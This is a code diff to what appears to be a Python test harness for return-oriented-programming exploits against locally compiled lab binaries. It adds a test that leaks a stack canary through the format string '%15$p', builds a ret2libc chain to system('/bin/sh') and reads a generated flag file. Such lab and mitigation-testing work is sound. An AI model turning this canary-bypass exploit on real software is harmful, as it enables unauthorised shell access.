@@ -69,7 +69,7 @@ class Ret2LibcShellTest(ROPTest):
             os.remove("flag.txt")
 
 class Ret2WinTest(ROPTest):
-    def __init__(self, binary="bin/ret2win", name="Ret2Win Test", description="Test to call win_function using ROP."):
+    def __init__(self, binary, name="Ret2Win Test", description="Test to call win_function using ROP."):
         super().__init__(
             name=name,
             description=description,
@@ -119,6 +119,70 @@ class Ret2WinTest(ROPTest):
         result = p.recvall(timeout=5).decode(errors='ignore')
         log.info(f"Execution result:\n{result}")
         
+        return 1.0 if self.flag in result else 0.0
+
+    def cleanup(self, actions: list[ConfigAction]):
+        super().cleanup(actions)
+        if os.path.exists("flag.txt"):
+            os.remove("flag.txt")
+
+class FormatStringBypassCanaryTest(ROPTest):
+    def __init__(self, binary, name="Format String Canary Bypass", description="Bypass canary using format string and spawn shell"):
+        super().__init__(name=name, description=description, binary=binary)
+        self.flag = ""
+
+    def configure_environment(self, selected_actions: list[ConfigAction]):
+        super().configure_environment(selected_actions)
+        
+        subprocess.run(['make', 'clean'], check=True)
+        subprocess.run(['make', self.binary], check=True)
+
+        random_string = os.urandom(16).hex()
+        self.flag = f"flag_{random_string}"
+        with open("flag.txt", "w") as f:
+            f.write(self.flag)
+            print(f"Flag written to file: {self.flag}")
+
+    def execute(self) -> bool:
+        BINARY = self.binary
+        elf = context.binary = ELF(BINARY)
+        p = process()
+        
+        p.sendline(b"%15$p")
+        canary = int(p.recvline().strip(), 16)
+        log.info(f"Leaked canary: {hex(canary)}")
+
+        # Get libc base addr
+        libc = elf.libc
+        libc.address = next(i for l, i in p.libs().items() if 'libc' in l.lower())
+        log.info(f"Libc base address: {hex(libc.address)}")
+        
+        system = libc.sym['system']
+        binsh = next(libc.search(b'/bin/sh'))
+
+        log.info(f"System: {hex(system)}")
+        log.info(f"/bin/sh: {hex(binsh)}")
+
+        rop = ROP(elf)
+        rop.call(system, [binsh])
+        log.info(f"ROP chain:\n{rop.dump()}")
+        RET = rop.find_gadget(['ret'])[0]
+
+        buffer_size = 64
+        padding = b'A' * buffer_size
+        padding += p64(canary)
+        padding += b'B' * 16
+
+        payload = padding + p64(RET) + rop.chain()
+
+        log.info(payload)
+
+        p.sendline(payload)
+        sleep(0.1)
+        p.sendline(b'cat flag.txt')
+        result = p.recvall(timeout=2).decode(errors='ignore')
+        log.info(f"Execution result:\n{result}")
+
         return 1.0 if self.flag in result else 0.0
 
     def cleanup(self, actions: list[ConfigAction]):
